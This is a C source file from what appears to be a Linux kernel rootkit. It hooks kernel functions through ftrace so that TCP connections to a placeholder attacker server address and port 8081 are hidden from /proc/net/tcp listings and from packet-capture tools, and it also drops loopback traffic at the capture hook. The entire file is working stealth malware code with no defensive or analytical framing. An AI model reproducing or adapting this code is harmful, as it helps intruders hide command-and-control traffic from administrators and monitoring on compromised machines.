#include "../include/core.h"
#include "../include/hiding_tcp.h"
#include "../ftrace/ftrace_helper.h"

#define PORT 8081

static asmlinkage long (*orig_tcp4_seq_show)(struct seq_file *seq, void *v);
static asmlinkage long (*orig_tcp6_seq_show)(struct seq_file *seq, void *v);
static int (*orig_tpacket_rcv)(struct sk_buff *skb, struct net_device *dev,
        struct packet_type *pt, struct net_device *orig_dev);

static const struct in6_addr ipv6_ip_ = YOUR_SRV_IPv6;
static __be32 cached_ipv4 = 0;

static notrace int hooked_tpacket_rcv(struct sk_buff *skb, struct net_device *dev,
        struct packet_type *pt, struct net_device *orig_dev)
{
    struct iphdr *iph;
    struct ipv6hdr *ip6h;
    struct tcphdr *tcph;
    unsigned int hdr_len;
    
    if (unlikely(!skb || !dev || !orig_tpacket_rcv))
        goto out;
    
    if (unlikely(cached_ipv4 == 0))
        cached_ipv4 = in_aton(YOUR_SRV_IP);
    
    if (dev->name[0] == 'l' && dev->name[1] == 'o')
        return NET_RX_DROP;
    
    if (skb_is_nonlinear(skb)) {

        if (in_hardirq() || skb_shared(skb))
            goto out;
        
        if (skb_linearize(skb))
            goto out;
    }
    
    if (skb->protocol == htons(ETH_P_IP)) {
        if (skb->len < sizeof(struct iphdr))
            goto out;
        
        iph = ip_hdr(skb);
        
        if (iph->daddr == cached_ipv4 || iph->saddr == cached_ipv4)
            return NET_RX_DROP;
        
        if (iph->protocol == IPPROTO_TCP) {
            hdr_len = iph->ihl * 4;
            if (hdr_len < sizeof(struct iphdr) || 
                skb->len < hdr_len + sizeof(struct tcphdr))
                goto out;
            
            tcph = (struct tcphdr *)((unsigned char *)iph + hdr_len);
            
            if (ntohs(tcph->dest) == PORT || ntohs(tcph->source) == PORT)
                return NET_RX_DROP;
        }
        
    } else if (skb->protocol == htons(ETH_P_IPV6)) {
        if (skb->len < sizeof(struct ipv6hdr))
            goto out;
        
        ip6h = ipv6_hdr(skb);
        
        if (ipv6_addr_equal(&ip6h->daddr, &ipv6_ip_) || 
            ipv6_addr_equal(&ip6h->saddr, &ipv6_ip_))
            return NET_RX_DROP;
        
        if (ip6h->nexthdr == IPPROTO_TCP) {
            if (skb->len < sizeof(struct ipv6hdr) + sizeof(struct tcphdr))
                goto out;
            
            tcph = (struct tcphdr *)((unsigned char *)ip6h + sizeof(*ip6h));
            
            if (ntohs(tcph->dest) == PORT || ntohs(tcph->source) == PORT)
                return NET_RX_DROP;
        }
    }

out:
    return orig_tpacket_rcv(skb, dev, pt, orig_dev);
}

static notrace asmlinkage long hooked_tcp4_seq_show(struct seq_file *seq, void *v)
{
    struct sock *sk = v;
    struct inet_sock *inet;
    int sport, dport;
    
    if (v == SEQ_START_TOKEN || sk == (void *)1)
        return orig_tcp4_seq_show(seq, v);
    
    if (unlikely(!sk || (unsigned long)sk < PAGE_SIZE))
        return orig_tcp4_seq_show(seq, v);
    
    inet = inet_sk(sk);
    if (unlikely(!inet))
        return orig_tcp4_seq_show(seq, v);
    
    if (unlikely(cached_ipv4 == 0))
        cached_ipv4 = in_aton(YOUR_SRV_IP);
    
    if (inet->inet_saddr == cached_ipv4 || inet->inet_daddr == cached_ipv4)
        return 0;
    
    sport = ntohs(inet->inet_sport);
    dport = ntohs(inet->inet_dport);
    
    if (sport == PORT || dport == PORT)
        return 0;
    
    return orig_tcp4_seq_show(seq, v);
}

static notrace asmlinkage long hooked_tcp6_seq_show(struct seq_file *seq, void *v)
{
    struct sock *sk = v;
    struct inet_sock *inet;
    int sport, dport;
    
    if (v == SEQ_START_TOKEN || sk == (void *)1)
        return orig_tcp6_seq_show(seq, v);
    
    if (unlikely(!sk || (unsigned long)sk < PAGE_SIZE))
        return orig_tcp6_seq_show(seq, v);
    
    if (ipv6_addr_equal(&sk->sk_v6_rcv_saddr, &ipv6_ip_) || 
        ipv6_addr_equal(&sk->sk_v6_daddr, &ipv6_ip_))
        return 0;
    
    inet = inet_sk(sk);
    if (unlikely(!inet))
        return orig_tcp6_seq_show(seq, v);
    
    sport = ntohs(inet->inet_sport);
    dport = ntohs(inet->inet_dport);
    
    if (sport == PORT || dport == PORT)
        return 0;
    
    return orig_tcp6_seq_show(seq, v);
}

static struct ftrace_hook new_hooks[] = {
    HOOK("tcp4_seq_show", hooked_tcp4_seq_show, &orig_tcp4_seq_show),
    HOOK("tcp6_seq_show", hooked_tcp6_seq_show, &orig_tcp6_seq_show),
    HOOK("tpacket_rcv", hooked_tpacket_rcv, &orig_tpacket_rcv),
};

notrace int hiding_tcp_init(void)
{
    cached_ipv4 = in_aton(YOUR_SRV_IP);
    return fh_install_hooks(new_hooks, ARRAY_SIZE(new_hooks));
}

notrace void hiding_tcp_exit(void)
{
    fh_remove_hooks(new_hooks, ARRAY_SIZE(new_hooks));
}